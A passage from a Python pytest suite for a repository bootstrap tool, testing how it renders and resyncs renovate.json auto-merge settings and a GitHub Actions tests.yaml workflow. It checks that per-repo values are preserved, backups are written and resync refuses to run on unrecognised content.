    assert parsed["extends"] == [
        "github>atlanhq/application-sdk//renovate-config/default.json"
    ]
    assert parsed["lockFileMaintenance"]["automerge"] is False
    assert any(r.get("automerge") is False for r in parsed.get("packageRules", []))


def test_renovate_json_soft_mode_conformance_package_carve_out() -> None:
    """Soft mode keeps auto-merge for the conformance package's own dedicated PR.

    The carve-out rule must come AFTER the '*' disable rule — Renovate applies
    packageRules in order and the last matching rule wins per option — and must
    be scoped to minor/patch (majors stay human-reviewed, like the preset).
    """
    import json

    content = render("renovate.json", automerge="false")
    rules = json.loads(content)["packageRules"]
    star_idx = next(i for i, r in enumerate(rules) if r["matchPackageNames"] == ["*"])
    conf_idx = next(
        i
        for i, r in enumerate(rules)
        if r["matchPackageNames"] == ["atlan-application-sdk-conformance"]
    )
    assert conf_idx > star_idx
    conf_rule = rules[conf_idx]
    assert conf_rule["automerge"] is True
    assert conf_rule["platformAutomerge"] is True
    assert conf_rule["matchUpdateTypes"] == ["minor", "patch"]


def test_renovate_json_hard_mode_has_no_conformance_carve_out() -> None:
    """Hard mode needs no exception — the fleet preset already auto-merges."""
    content = render("renovate.json")
    assert "atlan-application-sdk-conformance" not in content


def test_cmd_bootstrap_enforce_false_writes_soft_renovate(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--enforce false injects disable-automerge overrides into the renovate.json scaffold."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    renovate = (tmp_path / "renovate.json").read_text()
    assert '"automerge": false' in renovate
    assert "packageRules" in renovate


def test_cmd_bootstrap_no_enforce_hard_renovate_default(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Default bootstrap (no --enforce) writes minimal renovate.json (auto-merge via preset)."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    renovate = (tmp_path / "renovate.json").read_text()
    assert '"automerge": false' not in renovate


def test_cmd_bootstrap_enforce_force_overwrites_existing_renovate(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--enforce with custom content writes a .bak before overwriting."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    rj = tmp_path / "renovate.json"
    rj.write_text('{"customised": true}\n')
    # Re-run with --enforce false → must overwrite and back up custom content.
    _cmd_bootstrap(["--enforce", "false"])
    content = rj.read_text()
    assert '"automerge": false' in content  # soft-mode overrides applied
    assert (tmp_path / "renovate.json.bak").exists()  # custom content backed up


def test_cmd_bootstrap_enforce_idempotent_on_matching_content(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """--enforce is a no-op (and prints 'up to date') when file already matches target."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    rj = tmp_path / "renovate.json"
    mtime_before = rj.stat().st_mtime
    capsys.readouterr()  # clear
    _cmd_bootstrap(["--enforce", "false"])
    assert "up to date" in capsys.readouterr().out
    # File must not have been rewritten (mtime unchanged).
    assert rj.stat().st_mtime == mtime_before


def test_cmd_bootstrap_enforce_no_bak_when_canonical_content(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Switching from soft to hard mode doesn't write .bak (canonical content)."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    rj = tmp_path / "renovate.json"
    # Upgrade to hard mode — existing content is the canonical soft render, not custom.
    _cmd_bootstrap(["--enforce", "true"])
    assert not (tmp_path / "renovate.json.bak").exists()


def test_cmd_bootstrap_enforce_true_force_overwrites_existing_renovate(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--enforce true force-overwrites a soft-mode renovate.json to re-enable auto-merge."""
    monkeypatch.chdir(tmp_path)
    # First bootstrap in soft mode.
    _cmd_bootstrap(["--enforce", "false"])
    rj = tmp_path / "renovate.json"
    assert '"automerge": false' in rj.read_text()
    # Upgrade to hard mode.
    _cmd_bootstrap(["--enforce", "true"])
    content = rj.read_text()
    assert '"automerge": false' not in content  # overrides removed


# ---------------------------------------------------------------------------
# Granular levers, end to end: each moves exactly one of the two files, and
# --enforce still moves both (FND-347)
# ---------------------------------------------------------------------------


def _conformance_text(root: pathlib.Path) -> str:
    return (root / ".github" / "workflows" / "conformance.yaml").read_text()


def test_cmd_bootstrap_conformance_blocking_false_leaves_renovate_hard(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--conformance-blocking false stops conformance blocking and nothing else.

    This is the state --enforce could not express: observe-mode conformance
    with Renovate auto-merge still on.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--conformance-blocking", "false"])
    assert _EXIT_ZERO_SOFT in _conformance_text(tmp_path)
    assert '"automerge": false' not in (tmp_path / "renovate.json").read_text()


def test_cmd_bootstrap_renovate_automerge_false_leaves_conformance_blocking(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--renovate-automerge false takes the human back into the merge, and
    leaves conformance blocking CI."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--renovate-automerge", "false"])
    assert _EXIT_ZERO_HARD in _conformance_text(tmp_path)
    assert '"automerge": false' in (tmp_path / "renovate.json").read_text()


def test_cmd_bootstrap_granular_lever_overrides_enforce_shorthand(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An explicit granular lever wins over the shorthand for that lever only."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false", "--renovate-automerge", "true"])
    # Shorthand still governs the lever that wasn't named explicitly.
    assert _EXIT_ZERO_SOFT in _conformance_text(tmp_path)
    assert '"automerge": false' not in (tmp_path / "renovate.json").read_text()


def test_cmd_bootstrap_granular_lever_inherits_detected_enforce(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A lever left unset inherits the *detected* --enforce, not the hard default.

    Passing only --renovate-automerge on a soft-mode repo must not silently
    flip conformance back to blocking: the unnamed lever keeps whatever the
    repo's existing conformance.yaml says.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--enforce", "false"])
    _cmd_bootstrap(["--renovate-automerge", "true"])
    assert _EXIT_ZERO_SOFT in _conformance_text(tmp_path)
    assert '"automerge": false' not in (tmp_path / "renovate.json").read_text()


def test_cmd_bootstrap_renovate_automerge_force_updates_existing_file(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--renovate-automerge force-updates an existing renovate.json.

    renovate.json is write-if-absent, so without this the flag that governs
    exactly that file would be a no-op on every repo that already has one.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    rj = tmp_path / "renovate.json"
    assert '"automerge": false' not in rj.read_text()
    _cmd_bootstrap(["--renovate-automerge", "false"])
    assert '"automerge": false' in rj.read_text()


def test_cmd_bootstrap_conformance_blocking_does_not_force_renovate(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """--conformance-blocking must not rewrite renovate.json.

    It governs the other file, and renovate.json is write-if-absent — a
    customised one stays customised.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    rj = tmp_path / "renovate.json"
    rj.write_text('{"customised": true}\n')
    _cmd_bootstrap(["--conformance-blocking", "false"])
    assert rj.read_text() == '{"customised": true}\n'
    assert not (tmp_path / "renovate.json.bak").exists()


def test_cmd_bootstrap_no_lever_touches_the_tests_gate(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """No enforcement lever changes tests.yaml (FND-347).

    The tests gate becoming a required check is a branch-protection setting
    with no prerequisite here; if any of these flags started rendering
    tests.yaml differently, the gate milestone would once again be behind the
    0-touch bar.
    """
    monkeypatch.chdir(tmp_path)
    canonical = render("tests.yaml", app_name=tmp_path.name)
    for flags in (
        ["--enforce", "false"],
        ["--enforce", "true"],
        ["--conformance-blocking", "false"],
        ["--renovate-automerge", "false"],
    ):
        wf = tmp_path / ".github" / "workflows" / "tests.yaml"
        if wf.exists():
            wf.unlink()
        _cmd_bootstrap(flags)
        assert wf.read_text() == canonical, f"tests.yaml varied with {flags}"


# ---------------------------------------------------------------------------
# tests.yaml scaffold — write-if-absent semantics
# ---------------------------------------------------------------------------


def test_cmd_bootstrap_writes_tests_yaml(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert (tmp_path / ".github" / "workflows" / "tests.yaml").exists()


def test_cmd_bootstrap_tests_yaml_not_in_managed_workflows() -> None:
    assert "tests.yaml" not in MANAGED_WORKFLOWS


def test_cmd_bootstrap_tests_yaml_is_write_if_absent(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A second bootstrap run must NOT overwrite an already-customised tests.yaml."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text("# my custom content\n")
    _cmd_bootstrap([])
    assert wf.read_text() == "# my custom content\n"


def test_cmd_bootstrap_tests_yaml_recreated_when_deleted(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Delete tests.yaml → re-run bootstrap → file regenerated from canonical."""
    app_dir = tmp_path / "atlan-myapp-app"
    app_dir.mkdir()
    monkeypatch.chdir(app_dir)
    _cmd_bootstrap([])
    wf = app_dir / ".github" / "workflows" / "tests.yaml"
    wf.unlink()
    _cmd_bootstrap([])
    assert wf.exists()
    assert wf.read_text() == render("tests.yaml", app_name="myapp")


# ---------------------------------------------------------------------------
# Write-if-absent scaffolds — --resync
#
# These scaffolds are write-if-absent so apps can customise them, which left
# their C002 drift with no proportionate remediation: the only way to pull an
# old repo's structure forward was to delete the file and re-scaffold,
# discarding every per-repo value with it. These lock the flag that closes
# that gap — and, just as importantly, lock what it must NOT change.
# ---------------------------------------------------------------------------


def _drifted_tests_yaml(**params: str) -> str:
    """Return a canonical tests.yaml with a structural line removed.

    Deleting a line (rather than adding one) reproduces the real drift shape:
    a repo scaffolded by an older bootstrap is *missing* what newer templates
    added, which is exactly what C002 reports across the fleet.
    """
    canonical = render("tests.yaml", **params)
    lines = canonical.splitlines(keepends=True)
    return "".join(line for line in lines if "secrets: inherit" not in line)


def test_resync_restores_the_canonical(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_drifted_tests_yaml(app_name="app"))
    _cmd_bootstrap(["--resync"])
    assert wf.read_text() == render("tests.yaml", app_name="app")


def test_resync_clears_the_c002_finding(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The end-to-end property the flag exists for.

    Asserted through the checker rather than by comparing bytes to a render:
    a resync that produced a file the checker still called drifted would be
    worse than useless, and only C002 itself can rule that out.
    """
    from conformance.suite.checks.bootstrap_drift import scan_path

    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_drifted_tests_yaml(app_name="app"))
    assert scan_path(wf, tmp_path), "fixture is not actually drifted"
    _cmd_bootstrap(["--resync"])
    assert scan_path(wf, tmp_path) == []


def test_resync_preserves_per_repo_params(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Params are read off the file, not off the flags/autodetection.

    ``enable_e2e`` is the sharp case: it is never autodetected, so a resync
    that rendered from kwargs would silently switch e2e back on in a repo
    that turned it off — re-enabling a live-tenant suite nobody asked for.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    params = {
        "app_name": "widget",
        "app_image_name": "atlan-custom-widget-app",
        "enable_e2e": "false",
    }
    wf.write_text(_drifted_tests_yaml(**params))
    _cmd_bootstrap(["--resync"])
    assert wf.read_text() == render("tests.yaml", **params)


def test_resync_backs_up_the_previous_content(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A hand edit outside the extracted params is replaced, but recoverable."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    drifted = _drifted_tests_yaml(app_name="app") + "\n# a hand-added comment\n"
    wf.write_text(drifted)
    _cmd_bootstrap(["--resync"])
    assert "# a hand-added comment" not in wf.read_text()
    assert (
        tmp_path / ".github" / "workflows" / "tests.yaml.bak"
    ).read_text() == drifted


def test_resync_backup_is_gitignored(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The backup must never be committable.

    It lands inside .github/workflows/, so an un-ignored copy would show up in
    every subsequent PR diff of a repo that ran the flag once.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    assert "*.bak" in (tmp_path / ".gitignore").read_text().splitlines()


def test_resync_is_a_noop_when_already_canonical(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """No drift → no write, and no stray .bak."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    before = wf.read_text()
    _cmd_bootstrap(["--resync"])
    assert wf.read_text() == before
    assert not (tmp_path / ".github" / "workflows" / "tests.yaml.bak").exists()


@pytest.mark.parametrize(
    ("label", "mutate"),
    [
        ("canonical", lambda text: text),
        ("structural-line-removed", lambda text: _drifted_tests_yaml(app_name="app")),
        ("hand-added-comment", lambda text: text + "\n# hand-added\n"),
        (
            "repinned-action",
            lambda text: re.sub(r"@[0-9a-f]{40}", "@" + "a" * 40, text),
        ),
    ],
)
def test_resync_writes_exactly_when_c002_flags(
    label: str,
    mutate: object,
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The flag's trigger condition must be C002's finding condition.

    Both sides go through ``strip_action_pins``, so a pin difference is drift
    to neither — but the property that matters is the equivalence itself, not
    which comparison implements it: a resync that wrote on something C002
    calls clean would churn the file (and leave a .bak) on every run against
    a finding nobody raised, and one that stayed silent on something C002
    flags would leave the finding standing.
    """
    from conformance.suite.checks.bootstrap_drift import scan_path

    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(mutate(wf.read_text()))  # type: ignore[operator]
    before = wf.read_text()

    flagged = bool(scan_path(wf, tmp_path))
    _cmd_bootstrap(["--resync"])
    wrote = wf.read_text() != before

    assert wrote == flagged, f"{label}: resync wrote={wrote}, C002 flagged={flagged}"
    bak = tmp_path / ".github" / "workflows" / "tests.yaml.bak"
    assert bak.exists() == flagged


def test_bare_rerun_never_resyncs(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The flag is opt-in — the write-if-absent contract is unchanged without it."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_drifted_tests_yaml(app_name="app"))
    drifted = wf.read_text()
    _cmd_bootstrap([])
    assert wf.read_text() == drifted


def test_resync_scaffolds_when_absent(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Passing the flag on a repo with no tests.yaml still just scaffolds it."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--resync"])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    assert wf.read_text() == render(
        "tests.yaml", app_name=derive_app_name_from_dir(tmp_path)
    )
    assert not (tmp_path / ".github" / "workflows" / "tests.yaml.bak").exists()


def test_resync_rejects_a_value(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """It is a presence flag; `--resync=true` is an error, not a silent no-op."""
    monkeypatch.chdir(tmp_path)
    with pytest.raises(SystemExit) as exc:
        _cmd_bootstrap(["--resync=true"])
    assert exc.value.code == 2


def test_resync_reported_in_json_manifest(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """Both writes reach touched_files, so a remediation pass can scope a revert."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_drifted_tests_yaml(app_name="app"))
    capsys.readouterr()
    _cmd_bootstrap(["--resync", "--json"])
    payload = json.loads(capsys.readouterr().out.strip().splitlines()[-1])
    assert ".github/workflows/tests.yaml" in payload["touched"]
    assert ".github/workflows/tests.yaml.bak" in payload["touched"]


# ---------------------------------------------------------------------------
# FND-604: --resync must not silently drop per-repo CI wiring.
#
# It did, on 6 of 10 wave-D repos: an explicit `secrets:` mapping downgraded to
# `secrets: inherit` (which cannot compose the E2E_SOURCE_ENV_JSON the
# integration and e2e legs read) and a dropped `force-external-runtime: true`
# (boot then raises DaprNotDetectedError — FND-65). Nothing failed here; CI went
# red two tiers later with what read as a source-system credential error. These
# lock both halves of the fix: the two values now survive, and anything else the
# canonical has no place for stops the resync instead of being deleted.
# ---------------------------------------------------------------------------


# An explicit mapping, in the shape the wave-D repos hand-wrote (synthetic
# credential names). Deliberately carries a preceding comment and a block
# scalar: both are things a naive line-based preserve would mangle.
_EXPLICIT_SECRETS_BLOCK = """\
    # Mapped explicitly instead of `secrets: inherit`: inherit cannot compose.
    secrets:
      SDR_TEST_TENANT: ${{ secrets.SDR_TEST_TENANT }}
      E2E_SOURCE_ENV_JSON: |
        {"ATLAN_APP_MODULE": "app.widget:WidgetApp",
         "E2E_WIDGET_HOST": ${{ toJSON(secrets.E2E_WIDGET_HOST) }}}"""


def _customised_tests_yaml() -> str:
    """A drifted tests.yaml carrying both values FND-604 found being deleted.

    Written the way the apps wrote them rather than by rendering the template
    back at itself: the forced runtime sits at a position the canonical does not
    use and under its own explanatory comment (both real — the fleet hand-wrote
    it in two different places), and the explicit mapping replaces `inherit`
    entirely. A fixture rendered from the template would pass on a preserve that
    only works for the exact bytes the template emits.
    """
    canonical = render("tests.yaml", app_name="app")
    body = "".join(
        line
        for line in canonical.splitlines(keepends=True)
        if "secrets: inherit" not in line
    )
    body = body.replace(
        '      app-image-name: "atlan-app-app"\n',
        '      app-image-name: "atlan-app-app"\n'
        "      # main.py still expects external daprd at :3500 / Temporal at :7233.\n"
        "      force-external-runtime: true\n",
    )
    return body + _EXPLICIT_SECRETS_BLOCK + "\n"


def test_resync_keeps_an_explicit_secrets_mapping(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The downgrade that broke 6 repos: `secrets:` → `secrets: inherit`.

    Asserted on the mapping's contents, not just on the absence of `inherit`:
    the credential NAMES are the payload, and E2E_SOURCE_ENV_JSON is the one
    the reusable exports before the app server and pytest start.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_customised_tests_yaml())
    _cmd_bootstrap(["--resync"])
    after = wf.read_text()
    assert _EXPLICIT_SECRETS_BLOCK in after
    # Line-exact: the block's own comment mentions `secrets: inherit` by name.
    assert "    secrets: inherit\n" not in after


def test_resync_keeps_force_external_runtime(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Dropping this line makes the connector's main.py fail to boot (FND-65)."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_customised_tests_yaml())
    _cmd_bootstrap(["--resync"])
    assert "force-external-runtime: true" in wf.read_text()


def test_resync_of_a_customised_file_still_lands_the_structural_catch_up(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Preserving the two values must not cost the catch-up they blocked.

    A fix that merely refused on every customised file would leave the whole
    migrated fleet — where an explicit `secrets:` mapping is the norm, not the
    exception — permanently unable to pull a structural update.
    """
    from conformance.suite.checks.bootstrap_drift import scan_path

    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_customised_tests_yaml())
    assert scan_path(wf, tmp_path), "fixture is not actually drifted"
    _cmd_bootstrap(["--resync"])
    assert scan_path(wf, tmp_path) == []


def test_resync_is_idempotent_on_a_customised_file(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A second run must be a no-op, or the fleet churns a .bak on every run."""
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_customised_tests_yaml())
    _cmd_bootstrap(["--resync"])
    once = wf.read_text()
    (tmp_path / ".github" / "workflows" / "tests.yaml.bak").unlink()
    _cmd_bootstrap(["--resync"])
    assert wf.read_text() == once
    assert not (tmp_path / ".github" / "workflows" / "tests.yaml.bak").exists()


def _tests_yaml_with_an_extra_job() -> str:
    """A drifted tests.yaml keeping a second job, as several migrated repos do.

    The realistic remaining case: the job's name is what the repo's branch
    protection requires, so deleting it takes the required check with it.
    """
    return _drifted_tests_yaml(app_name="app") + (
        "\n  tests-passed:\n"
        "    needs: [tests]\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo ok\n"
    )


def test_resync_refuses_rather_than_deleting_an_unrecognised_declaration(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The generalising half of the fix, and the safer default FND-604 asked for.

    Carrying the two known values forward only covers the two known values; the
    refusal covers whatever the next unrecognised per-repo value turns out to
    be, without having had to anticipate it.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_tests_yaml_with_an_extra_job())
    before = wf.read_text()
    _cmd_bootstrap(["--resync"])
    assert wf.read_text() == before
    assert not (tmp_path / ".github" / "workflows" / "tests.yaml.bak").exists()


def test_resync_refusal_names_what_it_refused_over(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A refusal that doesn't say what it saw is the silent loss in a costume.

    The whole failure mode was invisibility: the removals only showed up in a
    deliberate diff against HEAD, so the message has to carry the finding.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_tests_yaml_with_an_extra_job())
    capsys.readouterr()
    _cmd_bootstrap(["--resync"])
    out = capsys.readouterr().out
    assert "skipped" in out
    assert "tests-passed" in out


def test_resync_refusal_touches_nothing(
    tmp_path: pathlib.Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """A refused file must not appear in the --json touched-files manifest.

    A remediation pass scopes its commit (and its revert) to that list, so a
    path reported as touched but left unchanged would put an unrelated hand edit
    inside the pass's write scope.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    wf.write_text(_tests_yaml_with_an_extra_job())
    capsys.readouterr()
    _cmd_bootstrap(["--resync", "--json"])
    payload = json.loads(capsys.readouterr().out.strip().splitlines()[-1])
    assert ".github/workflows/tests.yaml" not in payload["touched"]


# --- --resync's second target: renovate.json -------------------------------


def _drifted_renovate_json(automerge: str) -> str:
    """Return a canonical renovate.json with a structural key removed.

    Drops `$schema` specifically: it is a key newer templates added, so its
    absence is the real "repo scaffolded by an older bootstrap" shape, and it
    is not the key the auto-merge mode is read from — so the fixture exercises
    structural drift without also destroying the value the resync must
    preserve.
    """
    payload = json.loads(render("renovate.json", automerge=automerge))
    payload.pop("$schema")
    return json.dumps(payload, indent=2) + "\n"


def test_drifted_renovate_json_fixture_is_actually_drifted() -> None:
    """Guard the fixture itself.

    A re-serialised canonical can round-trip byte-identical, which would make
    every test below vacuously pass by resyncing a file that was never
    drifted.
    """
    for automerge in ("true", "false"):
        assert _drifted_renovate_json(automerge) != render(
            "renovate.json", automerge=automerge
        )


@pytest.mark.parametrize("automerge", ["true", "false"])
def test_resync_restores_renovate_json_keeping_its_mode(
    automerge: str, tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The auto-merge mode is read off the file, never re-decided.

    Parametrised over both modes because getting this wrong in the soft
    direction is the expensive one: silently flipping a repo to auto-merge
    turns a human-gated dependency lane into a 0-touch one.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([f"--renovate-automerge={automerge}"])
    dest = tmp_path / "renovate.json"
    dest.write_text(_drifted_renovate_json(automerge))
    _cmd_bootstrap(["--resync"])
    assert dest.read_text() == render("renovate.json", automerge=automerge)


def test_resync_clears_the_renovate_json_c002_finding(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    from conformance.suite.checks.bootstrap_drift import scan_path

    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    dest = tmp_path / "renovate.json"
    dest.write_text(_drifted_renovate_json("true"))
    assert scan_path(dest, tmp_path), "fixture is not actually drifted"
    _cmd_bootstrap(["--resync"])
    assert scan_path(dest, tmp_path) == []


def test_explicit_mode_flag_beats_resync(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`--renovate-automerge` CHANGES the mode; `--resync` PRESERVES it.

    Passing both is an intentional mode change, so the explicit flag must win
    — otherwise the resync's read-back-off-disk value would silently make the
    explicit flag a no-op.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--renovate-automerge=false"])
    dest = tmp_path / "renovate.json"
    dest.write_text(_drifted_renovate_json("false"))
    _cmd_bootstrap(["--renovate-automerge=true", "--resync"])
    assert dest.read_text() == render("renovate.json", automerge="true")


# --- identity guards: skip rather than rewrite from guessed defaults --------


def test_resync_skips_renovate_json_that_is_not_valid_json(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """An unreadable mode must not resolve to the auto-merge canonical.

    `extract_renovate_automerge` answers "true" for anything it can't parse —
    right for its other callers, but here it would turn an unparseable
    soft-mode file into a repo where Renovate merges without a human.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap(["--renovate-automerge=false"])
    dest = tmp_path / "renovate.json"
    dest.write_text("{ this is not json\n")
    _cmd_bootstrap(["--resync"])
    assert dest.read_text() == "{ this is not json\n"
    assert not (tmp_path / "renovate.json.bak").exists()


def test_resync_skips_tests_yaml_with_no_readable_app_name(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A file drifted past its own name gets a human, not a rename.

    Without the guard, `render` falls back to app_name="app" and the resync
    quietly renames the app in every downstream CI input while reporting
    success.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    nameless = "\n".join(
        line
        for line in render("tests.yaml", app_name="widget").splitlines()
        if "app-name:" not in line
    )
    wf.write_text(nameless)
    _cmd_bootstrap(["--resync"])
    assert wf.read_text() == nameless
    assert not (tmp_path / ".github" / "workflows" / "tests.yaml.bak").exists()


def test_resync_skips_tests_yaml_with_only_a_commented_app_name(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A commented-out `app-name:` must not satisfy the identity guard.

    That is the most common shape of a renamed app — the old line left
    commented out. An unanchored extractor would read the stale value off the
    comment and rewrite every downstream CI input to it while reporting
    success; the anchored one treats the file as having no parseable app-name
    and skips instead.
    """
    monkeypatch.chdir(tmp_path)
    _cmd_bootstrap([])
    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
    renamed = "\n".join(
        f"# {line}" if "app-name:" in line else line
        for line in render("tests.yaml", app_name="widget").splitlines()
    )
    wf.write_text(renamed)
    _cmd_bootstrap(["--resync"])
    assert wf.read_text() == renamed
    assert not (tmp_path / ".github" / "workflows" / "tests.yaml.bak").exists()


# ---------------------------------------------------------------------------
# tests.yaml template fidelity
# ---------------------------------------------------------------------------


def test_tests_yaml_workflow_name_is_capitalized() -> None:
    content = render("tests.yaml")
    assert "name: Tests\n" in content


def test_tests_yaml_contains_reusable_reference() -> None:
    content = render("tests.yaml")
    assert (
        "atlanhq/application-sdk/.github/workflows/tests-reusable.yaml@main" in content
    )


def test_tests_yaml_contains_remediation_header() -> None:
    content = render("tests.yaml")
    assert "bootstrap" in content
    assert "C002" in content


def test_tests_yaml_contains_services_script_hint() -> None:
    content = render("tests.yaml")
    assert "# services-script:" in content


def test_tests_yaml_contains_secrets_inherit() -> None:
    content = render("tests.yaml")
    assert "secrets: inherit" in content


def test_tests_yaml_default_app_name() -> None:
    content = render("tests.yaml")
    assert 'app-name: "app"' in content
    assert 'app-image-name: "atlan-app-app"' in content
    assert "enable-e2e:" not in content


def test_tests_yaml_custom_app_name_and_image() -> None:
    content = render("tests.yaml", app_name="mysql", app_image_name="atlan-mysql-app")
    assert 'app-name: "mysql"' in content
    assert 'app-image-name: "atlan-mysql-app"' in content


def test_tests_yaml_app_image_derived_when_not_given() -> None:
    content = render("tests.yaml", app_name="openapi")
    assert 'app-image-name: "atlan-openapi-app"' in content


def test_tests_yaml_enable_e2e_false() -> None:
    content = render("tests.yaml", enable_e2e="false")
    assert "enable-e2e: false" in content


def test_tests_yaml_services_script_active() -> None:
    content = render("tests.yaml", services_script=".github/test/setup-services.sh")
    assert 'services-script: ".github/test/setup-services.sh"' in content
    # The commented hint must NOT appear when the value is active.
